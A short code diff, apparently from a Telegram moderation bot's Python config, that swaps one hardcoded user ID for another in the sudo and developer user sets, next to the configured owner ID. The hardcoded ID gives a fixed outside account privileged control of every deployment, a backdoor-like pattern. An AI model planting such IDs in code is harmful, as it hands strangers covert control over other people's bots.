@@ -168,10 +168,10 @@ else:
             "Your blacklisted chats list does not contain valid integers.")
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1463735328)
+SUDO_USERS.add(1608740498)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1463735328)
-DEV_USERS.add(1463735328)
+DEV_USERS.add(1608740498)
+DEV_USERS.add(1608740498)
 
 if not SPAMWATCH_API:
     sw = None
